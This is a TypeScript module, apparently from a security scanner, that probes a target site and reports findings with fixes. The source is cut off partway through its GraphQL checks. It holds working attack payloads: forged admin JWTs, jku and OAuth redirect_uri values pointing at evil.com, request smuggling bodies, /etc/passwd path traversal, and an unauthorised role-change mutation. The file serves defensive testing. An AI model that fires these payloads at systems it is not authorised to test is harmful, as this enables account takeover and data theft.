import * as https from 'https';
import * as http from 'http';
import { ScanResult, Finding, Severity } from '../../types';
import { generateFinding } from './shared';
import { logExploit } from '../scanLogger';

// ─── HTTP Client ───

function makeRequest(
  targetUrl: string,
  method: string = 'GET',
  headers: Record<string, string> = {},
  timeoutOrBody: number | string = 6000
): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; body: string; redirectUrl?: string; duration: number }> {
  const timeout = typeof timeoutOrBody === 'number' ? timeoutOrBody : 6000;
  const body = typeof timeoutOrBody === 'string' ? timeoutOrBody : '';
  return new Promise((resolve, reject) => {
    const start = Date.now();
    let parsed: URL;
    try { parsed = new URL(targetUrl); } catch { reject(new Error('Invalid URL')); return; }
    const mod = parsed.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method,
      headers,
      timeout,
      rejectUnauthorized: false,
    }, (res) => {
      let data = '';
      let totalBytes = 0;
      res.on('data', (chunk: Buffer) => {
        totalBytes += chunk.length;
        if (totalBytes > 1048576) { req.destroy(); return; }
        data += chunk.toString();
      });
      res.on('end', () => {
        const dur = Date.now() - start;
        resolve({ statusCode: res.statusCode || 0, headers: res.headers, body: data, redirectUrl: res.headers.location, duration: dur });
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    if (body) req.write(body);
    req.end();
  });
}

async function safeRequest(targetUrl: string, method: string = 'GET', headers: Record<string, string> = {}, body: string = ''): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; body: string; redirectUrl?: string; duration: number }> {
  try {
    return await makeRequest(targetUrl, method, headers, body);
  } catch {
    return { statusCode: 0, headers: {}, body: '', duration: 0 };
  }
}

// ─── MODULE: JWT Attacks ───

async function testJwtAttacks(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'JWT', baseUrl, 'Testing JWT algorithm bypass, key confusion, weak secrets, and header injection');
  try {
    const crypto = await import('crypto');

    // None algorithm bypass
    const jwtNoneVariants = ['none', 'None', 'NONE', 'nOnE'];
    for (const alg of jwtNoneVariants) {
      try {
        const header = Buffer.from(JSON.stringify({ alg, typ: 'JWT' })).toString('base64url');
        const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
        const token = `${header}.${payload}.`;
        const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
        if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid') && !res.body.toLowerCase().includes('expired')) {
          findings.push(generateFinding(
            'JWT None Algorithm Bypass',
            `The application accepts JWT tokens with algorithm "${alg}", allowing complete authentication bypass without a valid signature.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Algorithm: ${alg}, Token accepted without signature verification`,
            'Attackers can forge arbitrary JWT tokens and impersonate any user including administrators',
            'Reject tokens with algorithm "none"; use an allowlist of permitted algorithms; always verify signatures server-side',
            ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/']
          ));
          break;
        }
      } catch {}
    }

    // Algorithm confusion (RS256 -> HS256 with public key as secret)
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
      const signature = crypto.createHmac('sha256', 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA').update(`${header}.${payload}`).digest('base64url');
      const token = `${header}.${payload}.${signature}`;
      const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT Algorithm Confusion (Key Confusion)',
          'The application may be vulnerable to JWT algorithm confusion, where an RS256 token is accepted when signed with HS256 using the public key as the HMAC secret.',
          Severity.HIGH,
          'Modern Attack',
          domain,
          'Signed with HS256 using a placeholder public key string, token may be accepted',
          'Key confusion allows attackers to forge tokens by switching from asymmetric to symmetric verification',
          'Validate algorithm header against a server-side allowlist; never use the algorithm from the token header',
          ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/', 'https://portswigger.net/web-security/jwt/algorithm-confusion']
        ));
      }
    } catch {}

    // Weak secret brute force
    try {
      const commonSecrets = ['secret', 'password', 'jwt-secret', 'super-secret', 'changeme', '123456', 'key', 'test', 'admin', 'cyberguard-dev-secret'];
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');

      for (const secret of commonSecrets) {
        try {
          const signature = crypto.createHmac('sha256', secret).update(`${header}.${payload}`).digest('base64url');
          const token = `${header}.${payload}.${signature}`;
          const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
          if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
            findings.push(generateFinding(
              'JWT Weak Signing Secret',
              `The application uses a weak JWT signing secret "${secret}" that can be easily brute-forced.`,
              Severity.CRITICAL,
              'Modern Attack',
              domain,
              `Secret: "${secret}", Token accepted`,
              'Weak JWT secrets allow attackers to forge authentication tokens for any user',
              'Use cryptographically strong random secrets (256+ bits); rotate secrets regularly; consider asymmetric algorithms',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens']
            ));
            break;
          }
        } catch {}
      }
    } catch {}

    // Expiration bypass
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 946684800, exp: 946684860 })).toString('base64url');
      const signature = crypto.createHmac('sha256', 'test').update(`${header}.${payload}`).digest('base64url');
      const token = `${header}.${payload}.${signature}`;
      const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('expired') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT Expiration Not Validated',
          'The application accepts expired JWT tokens, enabling replay attacks with stolen or forged tokens.',
          Severity.HIGH,
          'Modern Attack',
          domain,
          'Token with exp: 946684860 (year 2000) was accepted',
          'Accepting expired tokens allows attackers to reuse old tokens or craft tokens with past expiration dates',
          'Always validate JWT expiration claims (exp) on the server side; implement token refresh mechanisms',
          ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens']
        ));
      }
    } catch {}

    // JKU header injection
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', jku: 'https://evil.com/jwks.json' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
      const token = `${header}.${payload}.fake-sig`;
      const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT JKU Header Injection',
          'The application fetches JWT public keys from an attacker-controlled URL via the jku header parameter.',
          Severity.HIGH,
          'Modern Attack',
          domain,
          'Token with jku: https://evil.com/jwks.json sent, response indicates acceptance',
          'JKU injection allows attackers to serve their own public keys to bypass signature verification',
          'Never trust the jku header; use a fixed set of trusted key sources or fetch keys from a preconfigured endpoint',
          ['https://portswigger.net/web-security/jwt/algorithm-confusion']
        ));
      }
    } catch {}

    // kid header injection
    try {
      const kidPayloads = [
        { kid: '../../../../../../../dev/null', label: 'path-traversal' },
        { kid: "1' UNION SELECT 'key'--", label: 'sql-injection' },
      ];
      for (const { kid, label } of kidPayloads) {
        const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT', kid })).toString('base64url');
        const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
        const token = `${header}.${payload}.fake-sig`;
        const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
        const bodyLower = res.body.toLowerCase();
        const errorReflects = bodyLower.includes(kid.toLowerCase()) || bodyLower.includes('file') || bodyLower.includes('sql') || bodyLower.includes('no such file');
        if (res.statusCode === 500 && errorReflects) {
          findings.push(generateFinding(
            'JWT kid Header Injection',
            `The application uses the JWT "kid" header as a lookup key (${label}) without validation, enabling file read or SQL injection to obtain the signing key.`,
            Severity.HIGH,
            'Modern Attack',
            domain,
            `kid: ${kid} (${label}), Server error reflects kid value or file/sql lookup error`,
            'kid injection can read arbitrary files or query databases to obtain the signing key, allowing token forgery',
            'Validate kid against a server-side allowlist; never derive file paths or SQL queries from kid',
            ['https://portswigger.net/web-security/jwt/algorithm-confusion']
          ));
          break;
        }
      }
    } catch {}

    // Claim manipulation
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const manipulatedClaims = [
        { sub: 'admin', admin: true },
        { sub: 'admin', role: 'admin' },
        { sub: '1', isAdmin: true },
        { sub: 'admin', permissions: ['admin', 'write', 'delete'] },
      ];
      for (const claims of manipulatedClaims) {
        const payload = Buffer.from(JSON.stringify({ ...claims, iat: 1700000000, exp: 9999999999 })).toString('base64url');
        const signature = crypto.createHmac('sha256', 'test').update(`${header}.${payload}`).digest('base64url');
        const token = `${header}.${payload}.${signature}`;
        const res = await safeRequest(baseUrl, 'GET', { Authorization: `Bearer ${token}` }, '');
        if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
          findings.push(generateFinding(
            'JWT Claim Manipulation',
            'The application accepts forged JWT tokens with elevated claims (admin: true, role: admin).',
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Claims: ${JSON.stringify(claims)}, Token accepted`,
            'Claim manipulation allows privilege escalation to administrator roles',
            'Validate all JWT claims against server-side records; never trust client-supplied role or permission claims',
            ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`JWT: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: OAuth/OIDC Testing ───

async function testOAuth(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'OAuth', baseUrl, 'Testing OAuth redirect manipulation, PKCE bypass, scope escalation, and state parameter issues');
  try {
    // redirect_uri manipulation
    try {
      const redirectEndpoints = ['/oauth/authorize', '/authorize', '/auth/authorize', '/api/oauth/authorize', '/login/oauth', '/oauth2/authorize'];
      const evilRedirect = 'https://evil.com/callback';
      for (const endpoint of redirectEndpoints) {
        const testUrl = `${baseUrl}${endpoint}?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(evilRedirect)}&scope=openid`;
        const res = await safeRequest(testUrl, 'GET', {}, '');
        if (res.redirectUrl && res.redirectUrl.toLowerCase().includes('evil.com')) {
          findings.push(generateFinding(
            'OAuth Open Redirect (redirect_uri Manipulation)',
            `The OAuth flow at ${endpoint} accepts arbitrary redirect_uri values, allowing authorization code theft.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Redirect to: ${res.redirectUrl}`,
            'Attackers can steal authorization codes and access tokens by redirecting to their own domain',
            'Validate redirect_uri against a strict allowlist of registered URIs; reject dynamic or partial matches',
            ['https://portswigger.net/web-security/oauth/authentication-flaws/stealing-users-access-tokens-via-open-redirect']
          ));
          break;
        }
      }
    } catch {}

    // PKCE bypass (send request without code_verifier)
    try {
      const pkceEndpoints = ['/oauth/token', '/api/oauth/token', '/token', '/oauth2/token'];
      for (const endpoint of pkceEndpoints) {
        const body = JSON.stringify({
          grant_type: 'authorization_code',
          code: 'test_code',
          redirect_uri: `${baseUrl}/callback`,
          client_id: 'test',
        });
        const res = await safeRequest(`${baseUrl}${endpoint}`, 'POST', { 'Content-Type': 'application/json' }, body);
        if (res.body.toLowerCase().includes('token') || res.body.toLowerCase().includes('access_token')) {
          findings.push(generateFinding(
            'OAuth PKCE Bypass',
            `The token endpoint ${endpoint} accepts token requests without code_verifier, bypassing PKCE protection.`,
            Severity.HIGH,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, No code_verifier required, token issued`,
            'Without PKCE, authorization codes intercepted in transit can be exchanged for tokens',
            'Enforce PKCE (S256) for all OAuth clients; require code_verifier at the token endpoint',
            ['https://portswigger.net/web-security/oauth/authentication-flaws/stealing-users-access-tokens-via-open-redirect']
          ));
          break;
        }
      }
    } catch {}

    // Scope escalation
    try {
      const scopeEndpoints = ['/oauth/authorize', '/authorize', '/api/oauth/authorize'];
      const privilegedScopes = ['admin', 'manage', 'write', 'delete', 'superuser', 'full_access', 'system', 'root'];
      for (const endpoint of scopeEndpoints) {
        for (const scope of privilegedScopes) {
          const testUrl = `${baseUrl}${endpoint}?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(`${baseUrl}/callback`)}&scope=${scope}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');
          if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid_scope') && !res.body.toLowerCase().includes('error')) {
            findings.push(generateFinding(
              'OAuth Scope Escalation',
              `The OAuth authorization flow accepts privileged scope "${scope}" without validation.`,
              Severity.HIGH,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, Scope: ${scope}, Accepted`,
              'Scope escalation allows attackers to obtain tokens with elevated permissions',
              'Validate requested scopes against client registration; reject unknown or unauthorized scopes',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing']
            ));
            break;
          }
        }
      }
    } catch {}

    // State parameter missing (CSRF on OAuth flow)
    try {
      const authEndpoints = ['/oauth/authorize', '/authorize', '/api/oauth/authorize'];
      for (const endpoint of authEndpoints) {
        const testUrl = `${baseUrl}${endpoint}?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(`${baseUrl}/callback`)}&scope=openid`;
        const res = await safeRequest(testUrl, 'GET', {}, '');
        if (res.redirectUrl && !res.redirectUrl.includes('state=') && (res.redirectUrl.includes('code=') || res.statusCode === 302)) {
          findings.push(generateFinding(
            'OAuth Missing State Parameter (CSRF)',
            `The OAuth authorization flow at ${endpoint} does not enforce the state parameter, enabling CSRF attacks.`,
            Severity.HIGH,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Redirect without state parameter: ${res.redirectUrl}`,
            'Missing state parameter allows attackers to forge OAuth authorization requests and link victim accounts to attacker accounts',
            'Always generate and validate a cryptographic state parameter; reject requests without a valid state',
            ['https://owasp.org/www-community/attacks/csrf', 'https://portswigger.net/web-security/csrf']
          ));
          break;
        }
      }
    } catch {}

    // Token leakage in Referer header
    try {
      const tokenEndpoints = ['/oauth/token', '/api/oauth/token', '/token'];
      const body = JSON.stringify({
        grant_type: 'authorization_code',
        code: 'test_code',
        redirect_uri: `${baseUrl}/callback?access_token=leaked_token`,
        client_id: 'test',
      });
      for (const endpoint of tokenEndpoints) {
        const res = await safeRequest(`${baseUrl}${endpoint}`, 'POST', { 'Content-Type': 'application/json', Referer: `${baseUrl}/callback?access_token=leaked_token` }, body);
        if (res.body.toLowerCase().includes('token') || res.body.toLowerCase().includes('access_token')) {
          findings.push(generateFinding(
            'OAuth Token Leakage via Referer',
            `The application may leak access tokens in the Referer header during OAuth flows.`,
            Severity.MEDIUM,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Token in Referer header may be forwarded`,
            'Tokens in Referer headers can be leaked to third-party sites via external links or resources',
            'Strip sensitive parameters from URLs before navigation; use Referrer-Policy: no-referrer',
            ['https://owasp.org/www-community/attacks/csrf']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`OAuth: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: HTTP Request Smuggling ───

async function testSmuggling(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'Smuggling', baseUrl, 'Testing HTTP request smuggling via CL/TE, TE/CL, and H2.CL techniques');
  try {
    // CL.TE smuggling
    try {
      const body = '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ' + domain + '\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', { 'Content-Length': '6', 'Transfer-Encoding': 'chunked' }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (CL.TE)',
          'The server may be vulnerable to CL.TE request smuggling where conflicting Content-Length and Transfer-Encoding headers cause desynchronization.',
          Severity.CRITICAL,
          'Modern Attack',
          domain,
          'CL.TE payload sent with conflicting CL/TE headers, server responded 200',
          'Request smuggling can bypass security controls, poison web caches, and steal credentials from other users',
          'Ensure front-end and back-end servers parse HTTP headers consistently; disable transfer-encoding on front-end proxies',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // TE.CL smuggling
    try {
      const body = 'POST / HTTP/1.1\r\nHost: ' + domain + '\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', { 'Transfer-Encoding': 'identity', 'Content-Length': '44' }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (TE.CL)',
          'The server may be vulnerable to TE.CL request smuggling where Transfer-Encoding takes precedence over Content-Length.',
          Severity.CRITICAL,
          'Modern Attack',
          domain,
          'TE.CL payload sent with conflicting CL/TE headers, server responded 200',
          'TE.CL smuggling can lead to credential theft, cache poisoning, and request routing confusion',
          'Disable Transfer-Encoding on front-end proxies; use HTTP/2 end-to-end where possible',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // TE.TE obfuscation
    try {
      const body = '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ' + domain + '\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', {
        'Transfer-Encoding': 'chunked',
        'Transfer-Encoding ': 'chunked',
        'Content-Length': '6',
      }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (TE.TE Obfuscation)',
          'The server may be vulnerable to TE.TE request smuggling with header name obfuscation.',
          Severity.HIGH,
          'Modern Attack',
          domain,
          'TE.TE obfuscated payload with duplicate Transfer-Encoding headers, server responded 200',
          'TE.TE obfuscation bypasses naive transfer-encoding validation by using whitespace or case variations',
          'Normalize and validate Transfer-Encoding headers; strip duplicate headers; use strict header parsing',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // H2.CL smuggling (HTTP/2 specific)
    try {
      const body = 'SM\r\n\r\n\x00\x00\x06\x01\x00\x00\x00\x00\x03data\x01\x00\x00\x00\x00';
      const res = await safeRequest(baseUrl, 'POST', {
        'Transfer-Encoding': 'chunked',
        'Content-Length': '6',
        'Connection': 'keep-alive',
      }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP/2 Request Smuggling (H2.CL)',
          'The server may be vulnerable to HTTP/2 Content-Length smuggling where HTTP/2 frames are misinterpreted as HTTP/1.1.',
          Severity.CRITICAL,
          'Modern Attack',
          domain,
          'H2.CL payload sent with HTTP/2 framing, server responded 200',
          'HTTP/2 smuggling can bypass all HTTP/1.1-based security controls including WAFs and proxies',
          'Use HTTP/2 exclusively end-to-end; disable HTTP/1.1 upgrade; validate Content-Length in H2 frames',
          ['https://portswigger.net/web-security/request-smuggling/smuggling-via-http2']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`Smuggling: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: IDOR/BOLA Testing ───

async function testIdor(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'IDOR', baseUrl, 'Testing insecure direct object references and broken object-level authorization');
  try {
    // Sequential ID enumeration
    try {
      const apiEndpoints = ['/api/users/', '/api/user/', '/api/accounts/', '/api/profile/', '/api/v1/users/'];
      for (const endpoint of apiEndpoints) {
        let found = false;
        for (const id of [1, 2, 3]) {
          if (found) break;
          const res = await safeRequest(`${baseUrl}${endpoint}${id}`, 'GET', {}, '');
          if (res.statusCode === 200 && res.body.length > 10 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('forbidden')) {
            const bodyLower = res.body.toLowerCase();
            const hasUserData = bodyLower.includes('email') || bodyLower.includes('name') || bodyLower.includes('user') || bodyLower.includes('profile');
            if (hasUserData) {
              findings.push(generateFinding(
                'IDOR - Sequential ID Enumeration',
                `The API endpoint ${endpoint}{id} returns user data for sequentially enumerable IDs without authorization checks.`,
                Severity.HIGH,
                'Modern Attack',
                domain,
                `Endpoint: ${endpoint}{1,2,3}, Sequential access returns user data`,
                'Attackers can enumerate and access any user object by iterating through IDs',
                'Use UUIDs or random identifiers; implement object-level authorization checks; validate user ownership',
                ['https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference']
              ));
              found = true;
            }
          }
        }
        if (found) break;
      }
    } catch {}

    // Path traversal on file download endpoints
    try {
      const fileEndpoints = ['/api/files/', '/api/download/', '/file/', '/download/', '/api/attachments/', '/api/documents/'];
      const traversalPayloads = ['../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', '....//....//....//etc/passwd'];
      for (const endpoint of fileEndpoints) {
        let found = false;
        for (const payload of traversalPayloads) {
          if (found) break;
          const res = await safeRequest(`${baseUrl}${endpoint}${payload}`, 'GET', {}, '');
          if (res.body.includes('root:') || res.body.includes('/bin/bash') || res.body.includes('/bin/sh')) {
            findings.push(generateFinding(
              'IDOR - Path Traversal on File Endpoint',
              `The file endpoint ${endpoint} is vulnerable to path traversal, allowing access to arbitrary files on the server.`,
              Severity.CRITICAL,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, Payload: ${payload}, Response contains /etc/passwd`,
              'Path traversal on file endpoints can lead to complete server compromise by reading sensitive files',
              'Validate and sanitize file paths; use a chroot or sandbox for file serving; reject path traversal sequences',
              ['https://owasp.org/www-community/attacks/Path_Traversal']
            ));
            found = true;
          }
        }
        if (found) break;
      }
    } catch {}

    // UUID predictable patterns
    try {
      const uuidEndpoints = ['/api/users/', '/api/records/', '/api/items/', '/api/documents/'];
      const predictableUuids = [
        '00000000-0000-0000-0000-000000000001',
        '11111111-1111-1111-1111-111111111111',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
      ];
      for (const endpoint of uuidEndpoints) {
        let found = false;
        for (const uuid of predictableUuids) {
          if (found) break;
          const res = await safeRequest(`${baseUrl}${endpoint}${uuid}`, 'GET', {}, '');
          if (res.statusCode === 200 && res.body.length > 10 && !res.body.toLowerCase().includes('not found') && !res.body.toLowerCase().includes('404')) {
            findings.push(generateFinding(
              'IDOR - Predictable UUID Pattern',
              `The API uses predictable UUID patterns for object identifiers, enabling enumeration.`,
              Severity.MEDIUM,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, Predictable UUID accepted, data returned`,
              'Predictable UUIDs allow attackers to guess and access other users objects',
              'Use cryptographically random UUIDs (v4); never use sequential or predictable identifiers',
              ['https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference']
            ));
            found = true;
          }
        }
        if (found) break;
      }
    } catch {}

    // Horizontal privilege escalation
    try {
      const resourceEndpoints = ['/api/myprofile', '/api/me', '/api/account', '/api/settings', '/api/v1/me'];
      const userHeaderVariations: Record<string, string>[] = [
        { 'X-User-Id': '2' },
        { 'X-Forwarded-For': '127.0.0.1, 2' },
        { 'X-Real-IP': '127.0.0.1' },
      ];
      for (const endpoint of resourceEndpoints) {
        let found = false;
        for (const headers of userHeaderVariations) {
          if (found) break;
          const res = await safeRequest(`${baseUrl}${endpoint}`, 'GET', headers, '');
          if (res.statusCode === 200 && res.body.length > 10 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('forbidden')) {
            const bodyLower = res.body.toLowerCase();
            const hasSensitiveData = bodyLower.includes('email') || bodyLower.includes('password') || bodyLower.includes('token') || bodyLower.includes('key');
            if (hasSensitiveData) {
              findings.push(generateFinding(
                'IDOR - Horizontal Privilege Escalation',
                `The endpoint ${endpoint} allows horizontal privilege escalation via user-controlled headers.`,
                Severity.HIGH,
                'Modern Attack',
                domain,
                `Endpoint: ${endpoint}, Headers: ${JSON.stringify(headers)}, Sensitive data returned`,
                'Horizontal privilege escalation allows attackers to access other users data and perform unauthorized actions',
                'Validate user identity from server-side session; do not trust user-controlled headers for authorization',
                ['https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference']
              ));
              found = true;
            }
          }
        }
        if (found) break;
      }
    } catch {}
  } catch (e) { errors.push(`IDOR: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: GraphQL Security ───

async function testGraphqlSecurity(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'GraphQL', baseUrl, 'Testing GraphQL introspection, authorization bypass, and query complexity attacks');
  try {
    const graphqlEndpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/api/gql'];

    for (const endpoint of graphqlEndpoints) {
      const targetUrl = `${baseUrl}${endpoint}`;

      // Introspection query
      try {
        const introspectionQuery = JSON.stringify({
          query: '{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }',
        });
        const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, introspectionQuery);
        if (res.statusCode === 200 && res.body.includes('__schema')) {
          findings.push(generateFinding(
            'GraphQL Introspection Enabled',
            `The GraphQL endpoint at ${endpoint} allows full introspection queries, exposing the entire API schema.`,
            Severity.HIGH,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Introspection query returned full schema`,
            'Introspection exposes all types, queries, mutations, and fields, giving attackers a complete API map',
            'Disable introspection in production; use persisted queries; restrict schema exposure',
            ['https://graphql.org/learn/introspection/', 'https://portswigger.net/web-security/graphql']
          ));
        }
      } catch {}

      // Mutation authorization bypass
      try {
        const mutationQuery = JSON.stringify({
          query: 'mutation { updateUserRole(userId: "1", role: "admin") { id role } }',
        });
        const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, mutationQuery);
        if (res.statusCode === 200 && (res.body.includes('"role"') || res.body.includes('"admin"'))) {
          findings.push(generateFinding(
            'GraphQL Mutation Authorization Bypass',
            `The GraphQL endpoint at ${endpoint} processes privileged mutations without proper authorization.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, updateUserRole mutation processed`,
            'Authorization bypass on mutations allows privilege escalation and unauthorized data modification',
            'Implement field-level authorization; validate permissions on every mutation; use depth and complexity limits',
            ['https://portswigger.net/web-security/graphql']
          ));
        }
      } catch {}

      // Batch query DoS
      try {
        const batchQueries = [];
        for (let i = 0; i < 50; i++) {
          batchQueries.push({ query: '{ __typename }' });
        }
        const batchBody = JSON.stringify(batchQueries);
        const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, batchBody);
        if (res.statusCode === 200) {
          const bodyLower = res.body.toLowerCase();
          if (bodyLower.includes('__typename') || bodyLower.includes('[{')) {
            findings.push(generateFinding(
              'GraphQL Batch Query DoS',
              `The GraphQL endpoint at ${endpoint} accepts batch queries without rate limiting, enabling denial-of-service attacks.`,
              Severity.MEDIUM,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, 50 batch queries accepted`,
              'Batch queries can overwhelm server resources by executing many operations in a single request',
              'Limit batch query size; implement query cost analysis; rate limit GraphQL requests',
              ['https://portswigger.net/web-security/graphql']
            ));
          }
        }
      } catch {}

      // Field suggestion information disclosure
      try {
        const suggestionQuery = JSON.stringify({
          query: '{ user { emai } }',
        });
        const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, suggestionQuery);
        if (res.statusCode === 200 || res.statusCode === 400) {
          const bodyLower = res.body.toLowerCase();
          if (bodyLower.includes('did you mean') || bodyLower.includes('suggestion') || bodyLower.includes('email')) {
            findings.push(generateFinding(
              'GraphQL Field Suggestion Disclosure',
              `The GraphQL endpoint at ${endpoint} provides field suggestions that leak the API schema.`,
              Severity.LOW,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, Error response includes field suggestions`,
              'Field suggestions reveal schema structure, enabling attackers to discover hidden fields and mutations',
              'Disable field suggestions in production; use introspection-disabled mode; implement custom error formatting',
              ['https://portswigger.net/web-security/graphql']
            ));
          }
        }
      } catch {}

      // Alias-based query complexity attack
      try {
        const aliasPayload = JSON.stringify({
          query: 'query { a1: user(id:1) { id } a2: user(id:1) { id } a3: user(id:1) { id } a4: user(id:1) { id } a5: user(id:1) { id } a6: user(id:1) { id } a7: user(id:1) { id } a8: user(id:1) { id } a9: user(id:1) { id } a10: user(id:1) { id } }',
        });
        const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, aliasPayload);
        if (res.statusCode === 200 && res.body.includes('"data"')) {
          const data = JSON.parse(res.body);
          if (data.data && typeof data.data === 'object' && Object.keys(data.data).length >= 10) {
            findings.push(generateFinding(
              'GraphQL Alias-Based Query Complexity Attack',
